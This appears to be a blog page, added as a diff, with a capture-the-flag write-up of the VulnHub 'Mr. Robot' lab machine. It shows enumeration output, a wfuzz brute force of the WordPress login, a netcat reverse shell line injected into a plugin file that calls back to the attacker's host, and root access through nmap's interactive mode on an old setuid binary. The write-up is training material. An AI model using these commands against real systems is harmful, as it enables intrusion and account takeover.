@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Mr. Robot - Writeup</title>
+        <style>
+
+    html body {
+        font-family: '', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: green;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://0x23b.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=">
+
+
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.32.4" />
+        
+        
+        
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91628530-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+
+          gtag('config', 'UA-91628530-1');
+        </script>
+        
+    </head>
+
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+
+    <body>
+        
+
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Mr. Robot - Writeup</a>
+					
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="https://0x23b.github.io/">Home</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/about">About</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/tags/">Tags</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/posts/">Posts</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="https://github.com/0x23b/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/0x23b/"><i class="fa fa-twitter"></i></a></li>
+                            
+							<li class="navbar-icon"></li>
+
+                        </ul>
+						
+						<ul class="nav navbar-nav navbar-right">
+                        </ul>
+						
+						
+
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="https://0x23b.github.io/posts/vulnhub/2018-12-31-vulnhub_mrrobot_1_writeups/">Mr. Robot - Writeup</a></h4>
+    <h5>November 30, 2018</h5>
+    
+    <a href="https://0x23b.github.io/tags/vulnhub"><kbd class="item-tag">Vulnhub</kbd></a>
+    
+    <a href="https://0x23b.github.io/tags/writeups"><kbd class="item-tag">Writeups</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<h1 id="mr-robot-writeup">Mr. Robot - Writeup</h1>
+
+<h2 id="summary">Summary</h2>
+
+<p>For initial foothold, I had to get access to Wordpress as admin user and edit the php file of a plugin in order to get a reverse shell. For root user, there was an old nmap with suid bit, which allowed executing commands in interactive mode.</p>
+
+<h2 id="netdiscover">Netdiscover</h2>
+
+<p>First, find out the IP address of the victim machine. Therefore I’am using netdiscover:</p>
+
+<pre><code class="language-bash">Currently scanning: 192.168.66.0/16   |   Screen View: Unique Hosts           
+
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
+ __________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -------------------------------------------------------------------------
+ 192.168.63.1    0a:00:27:00:00:0f      1      60  Unknown vendor              
+ 192.168.63.2    08:00:27:06:9a:fa      1      60  PCS Systemtechnik GmbH      
+ 192.168.63.5    08:00:27:1b:0d:36      1      60  PCS Systemtechnik GmbH      
+</code></pre>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>After finding the IP, we can scan the open ports on the machine:</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/mrrobot# nmap -p- -oA full 192.168.63.5
+# Nmap 7.70 scan initiated Fri Nov 30 15:29:46 2018 as: nmap -p- -oA full 192.168.63.5
+Nmap scan report for 192.168.63.3
+Host is up (0.00012s latency).
+Not shown: 65532 filtered ports
+PORT    STATE  SERVICE
+22/tcp  closed ssh
+80/tcp  open   http
+443/tcp open   https
+MAC Address: 08:00:27:27:C9:7A (Oracle VirtualBox virtual NIC)
+
+# Nmap done at Fri Nov 30 15:31:45 2018 -- 1 IP address (1 host up) scanned in 118.28 seconds
+</code></pre>
+
+<p>I discovered, that the only open ports are for ssh and http(s). So I run gobuster and try to find out, which pages or directories are available:</p>
+
+<h2 id="gobuster">Gobuster</h2>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/mrrobot# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.63.5/
+
+=====================================================
+Gobuster v2.0.0              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://192.168.63.5/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/11/30 15:31:50 Starting gobuster
+/images (Status: 301)
+/blog (Status: 301)
+/sitemap (Status: 200)
+/rss (Status: 301)
+/login (Status: 302)
+/0 (Status: 301)
+/video (Status: 301)
+/feed (Status: 301)
+/image (Status: 301)
+/atom (Status: 301)
+/wp-content (Status: 301)
+/admin (Status: 301)
+/audio (Status: 301)
+/intro (Status: 200)
+/wp-login (Status: 200)
+/css (Status: 301)
+/rss2 (Status: 301)
+/license (Status: 200)
+/wp-includes (Status: 301)
+/js (Status: 301)
+/Image (Status: 301)
+/rdf (Status: 301)
+/page1 (Status: 301)
+/readme (Status: 200)
+/robots (Status: 200)
+/dashboard (Status: 302)
+/%!(NOVERB) (Status: 301)
+/wp-admin (Status: 301)
+=====================================================
+2019/11/30 15:34:28 Finished
+=====================================================
+</code></pre>
+
+<h2 id="robots-txt">robots.txt</h2>
+
+<p>After visiting the webserver and calling robots.txt, we can see, that key-1-of-3.txt is on the server:</p>
+
+<pre><code>http://192.168.63.5/key-1-of-3.txt
+073403c8a58a1f80d943455fb30724b9
+</code></pre>
+
+<p>Also we can see, that there is a file fsocity.dic, which is a wordlist, which will be helpful later on.</p>
+
+<h2 id="wordpress">Wordpress</h2>
+
+<p>From the enumeration phase of the pages, we know, that the webserver is running wordpress. So we can use wpscan in order to gather more information, like vulnerabilities and usernames. As the usernames are the interesting ones, I will skip the vulnerabilities:</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/mrrobot# wpscan --url http://192.168.63.5/0 --wp-content-dir blog --enumerate u
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 3.4.2
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+[+] URL: http://192.168.63.5/0/
+[+] Started: Tue Jan 15 16:28:38 2019
+...
+[+] Enumerating Users
+ Brute Forcing Author IDs - Time: 00:00:00 &lt;=====================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] mich05654
+ | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+
+[+] elliot
+ | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+...
+</code></pre>
+
+<p>What we can do now is to login as e.g. elliot with brute forcing the password. Herefore we can use wfuzz:</p>
+
+<pre><code>root@kali:~/vulnhub/mrrobot# wfuzz -c -z file,fsocity.dic --hh 3643 -d &quot;log=elliot&amp;pwd=FUZZ&amp;wp-submit=Log+In&quot; http://192.168.63.5/wp-login.php
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.1 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.63.5/wp-login.php
+Total requests: 858160
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000001:  C=302      0 L       0 W      0 Ch            &quot;ER28-0652&quot;
+</code></pre>
+
+<p>Now we can login as elliot:ER28-0652.</p>
+
+<h2 id="machine-access">Machine access</h2>
+
+<p>In order to get access to the machine, I had to edit any plugin, as the php file will be executed at activation. So I added following line to the wp-mail-smtp/wp_mail_smtp.php file,</p>
+
+<pre><code class="language-bash">exec(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.63.4 443 &gt;/tmp/f&quot;);
+</code></pre>
+
+<p>setup my netcat listener and activated the plugin.</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/mrrobot# nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.63.4] from (UNKNOWN) [192.168.63.5] 41121
+/bin/sh: 0: can't access tty; job control turned off
+$ which python
+/usr/bin/python
+$ python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-admin$ ^Z
+[1]+  Angehalten              nc -lvnp 1453
+root@kali:~/vulnhub/mrrobot# stty raw -echo
+root@kali:~/vulnhub/mrrobot# nc -lvnp 443
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-admin$ stty rows 55
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-admin$ stty columns 288
+</code></pre>
+
+<p>After fully upgrading my shell, I searched for other keys, which I found in the home directory of the user robot. I was not able to read the key, as it belongs to that user, so I had to find a way to switch users. In the same directory, a password file was lying around, which hast he password of the user hashed in md5:</p>
+
+<pre><code class="language-bash">daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-admin$ cd /home
+daemon@linux:/home$ ls -la
+total 12
+drwxr-xr-x  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
+daemon@linux:/home$ cd robot
+daemon@linux:/home/robot$ ls -la
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+daemon@linux:/home/robot$ cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+daemon@linux:/home/robot$ cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+</code></pre>
+
+<p>A quick lookup on the internet revealed the reversed hash:</p>
+
+<pre><code class="language-bash">The MD5 hash:
+c3fcd3d76192e4007dfb496cca67e13b
+was succesfully reversed into the string:
+abcdefghijklmnopqrstuvwxyz
+</code></pre>
+
+<p>This allowed me to login as robot and grab the second key.</p>
+
+<pre><code class="language-bash">daemon@linux:/home/robot$ ssh robot@localhost
+ssh: connect to host localhost port 22: Connection refused
+daemon@linux:/home/robot$ su - robot
+Password:  
+$ whoami
+robot
+$ cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+</code></pre>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>I searched a while and looked for executables with the suid bit:</p>
+
+<pre><code class="language-bash">robot@linux:~$ find / -perm -4000 2&gt;/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+</code></pre>
+
+<p>I found, that nmap is listed. I know, that in a certain version in nmap it is possible to launch the interactive mode, which allows command execution. As the sticky bit was set, this meant, that I’m able to execute commands as root:</p>
+
+<pre><code class="language-bash">robot@linux:~$ nmap -V
+
+nmap version 3.81 ( http://www.insecure.org/nmap/ )
+robot@linux:~$ nmap --interactive
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+nmap&gt; !/bin/bash
+bash-4.3$ whoami
+robot
+bash-4.3$ id
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+bash-4.3$ exit
+waiting to reap child : No child processes
+nmap&gt; !sh
+# id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+# cd /root
+# ls -la
+total 32
+drwx------  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+-rw-------  1 root root 4058 Nov 14  2015 .bash_history
+-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
+drwx------  2 root root 4096 Nov 13  2015 .cache
+-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
+-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
+-rw-r--r--  1 root root  140 Feb 20  2014 .profile
+-rw-------  1 root root 1024 Sep 16  2015 .rnd
+
+# whoami &amp;&amp; cat key-3-of-3.txt
+root
+04787ddef27c3dee1ee161b21670b4e4
+</code></pre>
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
